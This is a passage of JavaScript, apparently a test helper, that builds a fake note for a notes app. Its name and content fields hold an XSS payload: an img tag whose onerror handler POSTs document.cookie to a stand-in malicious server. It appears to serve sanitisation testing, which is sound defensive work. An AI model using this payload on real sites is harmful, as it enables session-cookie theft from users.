...
function makeMaliciosNote() {
    [
        {
            "id": "7",
            "name": `malicios note <img
            src="https://url.to.file.which/does-not.exist"
            onerror="fetch('https://url.to.malicious.server/', { method: 'POST', body: document.cookie });"
          >`,
            "modified": "2019-09-20T23:00:00.000Z",
            "folderId": "2",
            "content": `malicios content <img
            src="https://url.to.file.which/does-not.exist"
            onerror="fetch('https://url.to.malicious.server/', { method: 'POST', body: document.cookie });"
          >`
        }
